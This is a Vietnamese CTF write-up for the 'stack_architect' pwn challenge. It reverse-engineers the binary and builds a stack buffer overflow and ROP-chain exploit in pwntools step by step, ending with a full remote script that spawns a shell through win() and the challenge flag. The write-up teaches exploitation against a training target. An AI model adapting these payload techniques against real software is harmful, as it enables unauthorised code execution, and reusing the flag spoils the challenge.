# stack_architect
## Description
Khởi động.  
`nc 45.122.249.68 10018`  
[Attachment](https://cnsc.uit.edu.vn/ctf/files/d9146f84789b9132242732525b630201/stack_architect.zip?token=eyJ1c2VyX2lkIjoxMTczLCJ0ZWFtX2lkIjo1MDUsImZpbGVfaWQiOjE4N30.YchsbA.UjdLJtRgxmogl5wA8vi0Sg8sci0)

## Solution
### Observation
Khi dùng ghidra để reverse binary thì ta thấy chương trình có các hàm thú vị `func1`, `func2`, `main`, `win`:  

![image](https://user-images.githubusercontent.com/44528004/147409463-6b4af67d-66ca-4035-aa40-8d69e88c5954.png)

Đầu tiên, ta sẽ xem hàm `win`. Hàm này sẽ kiểm tra xem `check2`, `check3`, `check4` có khác `0` hay không. Nếu có thì chương trình sẽ setup và gọi `system('/bin/sh')`. Vậy mục tiêu của chúng ta sẽ là làm cho 3 biến `check2`, `check3`, `check4` khác `0`.  

![image](https://user-images.githubusercontent.com/44528004/147409582-4d9ce9a3-2c34-45d7-92fc-e3866ac6c3e0.png)


Tiếp theo, ta xem hàm `func1`. Ở đây, ta thấy được rằng `check3` sẽ được gán bằng `1` nếu thoả điều kiện `check2 != 0 && param_1 == 0x20010508`. Đồng thời, `check2` sẽ được gán bằng `1` nếu `iVar1 == 0`, tương đương với việc chuỗi được lưu tại `local_58` của hàm `func1` phải bằng `I\'m sorry, don\'t leave me. I want you here with me ~~`.  

![image](https://user-images.githubusercontent.com/44528004/147409659-8ee27123-1562-452b-8211-2619886bb6b1.png)

Tiếp theo là hàm `func2`. Hàm này sẽ gán `check4` bằng `1` nếu `check3 != 0` và `local_8 == 0x8052001`.  

![image](https://user-images.githubusercontent.com/44528004/147409748-428948d8-3581-40b7-aa44-fc8d5e5df9a3.png)

Ở hàm `main`, ta thấy được rằng ta sẽ nhập vào 1 chuỗi và chuỗi này được lưu ở biến `local_58`. Đồng thời, có một biến `check1` sẽ có giá trị là 1 khi hàm kết thúc (vì nếu `check1 != 0` thì chương trình sẽ exit).  

![image](https://user-images.githubusercontent.com/44528004/147409488-c7b156b1-bc8d-4f13-8443-7a1cdf9d5a2b.png)  


### Exploit
Vì mục tiêu của chúng ta là các biến `check2`, `check3`, `check4` phải khác `0` nên ta sẽ cố gắng làm thoả các điều kiện để các biến này có được giá trị khác `0`. Ta sẽ lần lượt exploit `check2`, `check3` rồi đến `check4` vì `check4` phụ thuộc vào `check3` và `check3` phụ thuộc vào `check2`. Do đó, thứ tự gọi hàm tương ứng sẽ là `main` -> `func1` -> `func2` -> `win`.  

#### Return về được `func1`
Sau khi debug, ta có được bảng sau:  

| Đối tượng | Địa chỉ trên stack | Khoảng cách so với buffer (byte) |
|---|---|---|
| buffer | `0xffffd024` | 0 |
| `return address` của hàm `main` | `0xffffd07c` | 0x58 |
| `ebp` của hàm `main` | `0xffffd078` | - |

Từ đó, ta cần chèn 0x58 bytes junk vào buffer và thêm 4 bytes là địa chỉ của hàm `func1`.
```python
e = ELF('./stack_architect')
func1_addr = e.symbols['func1']
payload = b'A' * 0x58 + p32(func1_addr)
```

Khi thử debug với payload trên thì ta thấy được là ta đã return về `func1` thành công.  

![image](https://user-images.githubusercontent.com/44528004/147410362-2037df27-4751-4123-82d7-c0d93bca4d91.png)  

#### Truyền chuỗi vào buffer để thoả mãn điều kiện của `strcmp` trong `func1`
Ở `func1`, để `check2 = 1`, ta sẽ truyền chuỗi `I\'m sorry, don\'t leave me. I want you here with me ~~` vào vị trí nào đó trong buffer để biến `local_58` trong hàm `func1` sẽ bằng với chuỗi trên. Lúc này, ta sẽ có `check2 == 1` vì `strcmp` sẽ trả về `0` nếu 2 chuỗi bằng nhau. Vậy nếu ta gọi lại `func1` lần nữa, `check2` lúc này sẽ có giá trị là `1`. Tiếp theo, ta cần truyền giá trị `0x20010508` vào vị trí nào đó trên buffer để khi hàm truy xuất đến `param_1` sẽ lấy được giá trị `0x20010508` và làm thoả mãn điều kiện.  

Khi `disass` hàm `func1`, ta thấy được rằng `local_58` nằm tại `ebp - 0x54` (vì `local_58` là đối số thứ 1 của hàm `strcmp` nên sẽ được push vào stack sau).  

![image](https://user-images.githubusercontent.com/44528004/147410799-3ed87810-c625-42f8-9849-14dfd62710ec.png)  

Đồng thời, ta cũng biết được là `param_1` sẽ nằm tại vị trí `ebp + 0x8`.  

![image](https://user-images.githubusercontent.com/44528004/147410911-5fffc63b-078c-4196-a8d6-8d1a4b83410c.png)


Ta debug, xem các địa chỉ và lập được bảng sau:

| Đối tượng | Địa chỉ trên stack | Khoảng cách so với buffer (byte) |
|---|---|---|
| `ebp` của hàm `func1` | `0xffffd07c` | - |
| `local_58` | `ebp - 0x54 = 0xffffd07c - 0x54 = 0xffffd028` | 0x4 |
| `return address` của hàm `func1` | `0xffffd080` | 0x5c |

Vậy payload của ta lúc này sẽ là:  
```python
e = ELF('./stack_architect')
func1_addr = e.symbols['func1']
func2_addr = e.symbols['func2']

payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
payload += (0x58 - len(payload)) * b'A' + p32(func1_addr)
payload += p32(func1_addr)
```

Lúc này ta debug thì thấy được là ta đã chèn thành công chuỗi `I\'m sorry, don\'t leave me. I want you here with me ~~` vào stack để pass được điều kiện so sánh `strcmp`.  

![image](https://user-images.githubusercontent.com/44528004/147430599-424e0bc4-b9a7-4047-9466-0b4421b05699.png)  

Ta cũng thành công trong việc gọi hàm `func1` lần 2 để có giá trị `check2 = 1`.  

![image](https://user-images.githubusercontent.com/44528004/147430648-9c75f38b-d281-4e31-961c-1b85cb9ed685.png)  


#### Truyền giá trị vào `param_1` 
Ở lần gọi hàm `func1` lần thứ 2, thanh ghi `ebp` đang trỏ tới `0xffffd080` nên ta sẽ debug và lập bảng sau:

| Đối tượng | Địa chỉ trên stack | Khoảng cách so với buffer (byte) |
|---|---|---|
| `ebp` của hàm `func1` lần 2 | `0xffffd080` | - |
| `param_1` | `ebp + 0x8 = 0xffffd088` | 0x64 |
| `return address` của hàm `func1` lần 2 | `0xffffd084` | 0x60 |

Từ đây, ta có payload sau:
```python
e = ELF('./stack_architect')

func1_addr = e.symbols['func1']
func2_addr = e.symbols['func2']

payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
payload += p32(func1_addr)
payload += p32(func2_addr)
payload += p32(0x20010508)
```

Khi debug thì ta thấy được rằng `param_1` đã được gán bằng `0x20010508`.  

![image](https://user-images.githubusercontent.com/44528004/147431307-547bb427-651c-4f01-a664-0065018de550.png)

Đồng thời, ta cũng thấy được rằng chương trình đã return được về `func2`.  

![image](https://user-images.githubusercontent.com/44528004/147431410-d7f04924-d681-4068-b7d3-45ef41b7cc20.png)  

#### Xử lý xung đột vị trí ở `func2`
Khi vào `func2`, ta thấy rằng thanh ghi `ebp` đang trỏ tới `0xffffd084` và trùng với vị trí `return address` của hàm `func1` lần 2. Đồng thời, phía trên địa chỉ này trên stack còn có `param_1` của hàm `func1` lần 2.  

![image](https://user-images.githubusercontent.com/44528004/147431552-353b09f5-b53a-4383-a6b9-470f6232550f.png)  

Để xử lý việc này, ta cần thực thi câu lệnh `pop` 2 lần để thanh ghi `esp` trỏ tới cuối `payload`. Ta sẽ dùng `ROPgadget` để tìm các `pop` và `ret` gadget.   

![image](https://user-images.githubusercontent.com/44528004/147431723-01a16d57-9374-4a0f-88cf-449c58fca51a.png)

Ta thấy rằng, ta có 1 gadget có 2 lệnh `pop` nên ta sẽ dùng gadget này.
```
0x08049422 : pop edi ; pop ebp ; ret
```

Vậy ta sẽ thay đổi 1 chút ở `payload` để hàm `func1` lần 2 sẽ nhảy đến gadget thay vì nhảy đến `func2`.  
```python
p = process('./stack_architect')
e = ELF('./stack_architect')

func1_addr = e.symbols['func1']
func2_addr = e.symbols['func2']

payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
payload += p32(func1_addr)
payload += p32(0x08049422)
payload += p32(0x20010508)
```

Khi debug thì ta thấy rằng thanh ghi `esp` đã được *đẩy* xuống cuối `payload` và lúc này nó đang trỏ tới địa chỉ `0xffffd090` và sẽ cách buffer 0x6c bytes.  

![image](https://user-images.githubusercontent.com/44528004/147432194-08943f5e-1e2a-4c0a-bbc0-c1de6feafc23.png)

Cập nhất payload để chèn đỉa chỉ của `func2` vào stack để chương trình sẽ nhảy vào `func2` sau khi thực thi xong gadget.  
```python
e = ELF('./stack_architect')

func1_addr = e.symbols['func1']
func2_addr = e.symbols['func2']

payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
payload += p32(func1_addr)
payload += p32(0x08049422)
payload += p32(0x20010508)
payload += b'A' * 4
payload += p32(func2_addr)
```

Khi debug thì ta thấy chương trình đã return thành công về `func2`.  

![image](https://user-images.githubusercontent.com/44528004/147432405-bb602b45-c161-4e94-9cdb-a1b131a6144f.png)  

#### Chèn các giá trị vào buffer để thoả các điều kiện xét trong `func2`
Ta debug và lập được bảng sau:
| Đối tượng | Địa chỉ trên stack | Khoảng cách so với buffer (byte) |
|---|---|---|
| `ebp` của hàm `func2` | `0xffffd090` | - |
| `local_8` | `ebp - 0x4 = 0xffffd08c` | 0x68 |
| `return address` của hàm `func2` | `0xffffd094` | 0x70 |

Từ đó, ta có payload sau:
```python
e = ELF('./stack_architect')

func1_addr = e.symbols['func1']
func2_addr = e.symbols['func2']
win_addr = e.symbols['win']

payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
payload += p32(func1_addr)
payload += p32(0x08049422)
payload += p32(0x20010508)
payload += p32(0x08052001)
payload += p32(func2_addr)
payload += p32(win_addr)
```

### Exploit remote
Full script:
```python
from pwn import *

p = remote('45.122.249.68', 10018)
e = ELF('./stack_architect')

func1_addr = e.symbols['func1']
func2_addr = e.symbols['func2']
win_addr = e.symbols['win']

payload = b'A' * 0x4 + b'I\'m sorry, don\'t leave me, I want you here with me ~~\x00'
payload += (0x58 - len(payload)) * b'A'  + p32(func1_addr)
payload += p32(func1_addr)
payload += p32(0x08049422)
payload += p32(0x20010508)
payload += p32(0x08052001)
payload += p32(func2_addr)
payload += p32(win_addr)

with open('payload.in', 'wb') as f:
    f.write(payload)

p.sendline(payload)
p.interactive()
```

Kết quả chạy local
![image](https://user-images.githubusercontent.com/44528004/147432893-5bbe0f30-343e-4f31-a622-0277bcacdf7e.png)

> Vì khi viết writeup này, remote đã đóng nên chỉ demo local.  

Flag: `Wanna.One{neu_ban_chinh_phuc_duoc_chinh_minh_ban_co_the_chinh_phuc_duoc_the_gioi}`

